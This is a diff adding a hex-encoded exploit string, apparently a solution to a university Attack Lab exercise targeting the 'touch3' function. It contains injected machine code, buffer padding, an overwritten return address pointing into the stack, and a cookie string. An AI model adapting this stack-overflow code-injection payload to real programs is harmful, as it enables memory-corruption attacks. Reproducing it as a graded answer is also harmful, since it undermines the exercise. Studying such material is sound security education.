@@ -1,0 +1,22 @@
+/* my code injection (13 bytes) */
+48 c7 c7 38 ac 61 55 /* mov cookie string address into rdi */
+68 78 19 40 00 /* push touch3 address to the stack */
+c3 /* return */
+
+/* fill up the rest of the buffer */ 
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00
+
+/* address of register %rsp */
+d8 ab 61 55 00 00 00 00
+
+/* cookie padding */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+
+/* cookie string */
+37 30 32 30 36 62 37 37 00 
